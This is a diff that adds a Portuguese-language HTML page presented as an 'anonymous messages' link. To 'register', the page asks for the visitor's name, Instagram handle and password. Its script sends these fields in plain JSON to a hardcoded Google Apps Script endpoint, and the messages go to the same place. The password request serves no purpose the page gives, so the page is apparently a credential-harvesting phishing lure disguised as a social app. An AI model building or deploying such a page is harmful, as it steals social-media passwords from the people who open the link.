@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SECRET LINK 😈</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@800;900&display=swap');
+body{margin:0;font-family:'Inter',Arial;background:linear-gradient(135deg,#ff006a,#ff3c00,#ffb800);min-height:100vh;display:flex;justify-content:center;align-items:center}
+.card{width:92%;max-width:400px;background:#fff;border-radius:32px;padding:26px;text-align:center;color:#111;box-shadow:0 25px 50px rgba(0,0,0,0.35)}
+.badge{background:#111;color:#fff;padding:7px 14px;border-radius:20px;font-size:11px;font-weight:900;display:inline-block}
+h1{font-size:32px;margin:12px 0 5px;letter-spacing:-1.5px}
+.sub{color:#666;font-size:14px;margin-bottom:18px;font-weight:600}
+.aviso{background:#fff3f6;border:2px dashed #ff006a;border-radius:15px;padding:12px;font-size:13px;font-weight:800;color:#ff006a;margin-bottom:12px}
+input,textarea{width:100%;padding:16px;margin:7px 0;border-radius:16px;border:2px solid #eee;font-size:15px;box-sizing:border-box;outline:none}
+.btn{width:100%;padding:16px;background:#111;color:#fff;border:none;border-radius:20px;font-size:16px;font-weight:900;margin-top:10px;cursor:pointer}
+.btn:disabled{opacity:0.6}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="badge">ANÔNIMO 😈</div>
+<h1>me envie<br>mensagens anônimas</h1>
+<div class="sub">brigadeiros</div>
+
+<div class="aviso">🔒 Para enviar mensagem anônima, primeiro você deve se cadastrar.</div>
+
+<div id="cad">
+<input id="nome" placeholder="Seu nome">
+<input id="insta" placeholder="Seu @ do Instagram">
+<input id="senha" type="password" placeholder="senha">
+<button class="btn" id="btnCad" onclick="cadastrar()">CADASTRAR E CONTINUAR →</button>
+</div>
+
+<div id="enviarArea" style="display:none">
+<h3>Agora pode enviar 👇</h3>
+<textarea id="msg" placeholder="Digite sua mensagem anônima..."></textarea>
+<button class="btn" id="btnMsg" onclick="enviar()">ENVIAR ANÔNIMO 🚀</button>
+</div>
+</div>
+
+<script>
+const URL_BANCO = "https://script.google.com/macros/s/AKfycbzeLq3MJSgsi8lvEO86LOy_9uW_0VyIDWi3UOVn4ApKx5IW_PlJmNwQmtV2xYdOqg/exec";
+
+async function cadastrar(){
+ let nome = document.getElementById('nome').value;
+ let insta = document.getElementById('insta').value;
+ let senha = document.getElementById('senha').value;
+ if(!nome || !insta || !senha) return alert('Preencha tudo!');
+ 
+ document.getElementById('btnCad').innerText = "Salvando...";
+ document.getElementById('btnCad').disabled = true;
+
+ await fetch(URL_BANCO, {
+   method: "POST",
+   mode: "no-cors",
+   body: JSON.stringify({nome: nome, insta: insta, senha: senha, mensagem: "NOVO CADASTRO"})
+ });
+
+ document.querySelector('.aviso').innerHTML='✅ Cadastro feito! Agora pode enviar sua mensagem anônima.';
+ document.getElementById('cad').style.display='none';
+ document.getElementById('enviarArea').style.display='block';
+}
+
+async function enviar(){
+ let msg = document.getElementById('msg').value;
+ if(!msg) return alert('Digite a mensagem');
+ 
+ document.getElementById('btnMsg').innerText = "Enviando...";
+ 
+ await fetch(URL_BANCO, {
+   method: "POST",
+   mode: "no-cors",
+   body: JSON.stringify({nome: "-", insta: "-", senha: "-", mensagem: msg})
+ });
+ 
+ alert('Mensagem enviada com sucesso! 😈');
+ document.getElementById('msg').value='';
+ document.getElementById('btnMsg').innerText = "ENVIAR ANÔNIMO 🚀";
+}
+</script>
+</body>
+</html>
